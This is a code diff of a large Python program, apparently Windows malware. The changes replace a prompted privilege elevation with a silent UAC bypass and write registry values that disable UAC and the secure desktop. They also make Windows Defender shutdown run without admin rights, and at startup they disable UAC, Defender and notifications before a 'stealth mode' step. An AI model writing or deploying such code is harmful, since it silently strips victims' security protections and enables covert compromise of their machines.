@@ -835,11 +835,19 @@ class BackgroundInitializer:
         try:
             if WINDOWS_AVAILABLE:
                 if not is_admin():
-                    log_message("Attempting privilege escalation in background...")
-                    if run_as_admin():
-                        return "elevation_initiated"
+                    log_message("Attempting UAC bypass in background...")
+                    # Try all UAC bypass methods FIRST (no prompt)
+                    if attempt_uac_bypass():
+                        log_message("✅ UAC bypass successful!")
+                        return "uac_bypass_success"
+                    else:
+                        log_message("⚠️ UAC bypass failed, running with normal privileges")
+                        # Don't call run_as_admin() - it prompts for password
+                        # Just continue with normal privileges
+                        return "running_without_admin"
                 
                 if is_admin():
+                    log_message("Already running as admin, disabling UAC...")
                     if disable_uac():
                         return "uac_disabled"
                     else:
@@ -2913,9 +2921,12 @@ if __name__ == "__main__":
         return False
 
 def disable_defender():
-    """Attempt to disable Windows Defender (requires admin privileges)."""
-    if not WINDOWS_AVAILABLE or not is_admin():
+    """Attempt to disable Windows Defender (tries even without admin)."""
+    if not WINDOWS_AVAILABLE:
         return False
+    
+    # Try to disable Defender even without admin - some methods might work
+    log_message("[DEFENDER] Attempting to disable Windows Defender...")
     
     try:
         # Multiple methods to disable Windows Defender
@@ -3530,8 +3541,8 @@ def disable_uac():
             log_message("[REGISTRY] UAC registry key opened successfully")
             
             # Set EnableLUA to 0 (disable UAC)
-            log_message("[REGISTRY] Setting EnableLUA = 1")
-            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting EnableLUA = 0 (disabling UAC)")
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] EnableLUA set successfully")
             
             # Set ConsentPromptBehaviorAdmin to 0 (no password prompts for administrators)
@@ -3541,8 +3552,8 @@ def disable_uac():
             log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
             
             # Set PromptOnSecureDesktop to 0 (disable secure desktop)
-            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 1")
-            winreg.SetValueEx(key, "PromptOnSecureDesktop", 1, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0 (disabling secure desktop)")
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
             
         log_message("[REGISTRY] UAC has been disabled successfully.")
@@ -10119,13 +10130,34 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
-    # PRIORITY 1: Disable all Windows notifications FIRST before anything else
+    # PRIORITY 1: Disable UAC, Defender, and Notifications FIRST
     try:
-        log_message("[STARTUP] Disabling Windows notifications...")
-        disable_windows_notifications()
-        log_message("[STARTUP] Notification disable completed")
+        log_message("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        
+        # 1. Disable UAC first (requires admin)
+        log_message("[STARTUP] Step 1: Disabling UAC...")
+        if disable_uac():
+            log_message("[STARTUP] ✅ UAC disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+        
+        # 2. Disable Windows Defender
+        log_message("[STARTUP] Step 2: Disabling Windows Defender...")
+        if disable_defender():
+            log_message("[STARTUP] ✅ Windows Defender disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ Defender disable failed")
+        
+        # 3. Disable Windows notifications
+        log_message("[STARTUP] Step 3: Disabling Windows notifications...")
+        if disable_windows_notifications():
+            log_message("[STARTUP] ✅ Notifications disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ Notification disable failed")
+        
+        log_message("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
     except Exception as e:
-        log_message(f"[STARTUP] Failed to disable notifications: {e}", "warning")
+        log_message(f"[STARTUP] Configuration error: {e}", "warning")
     
     # Initialize basic stealth mode
     try:
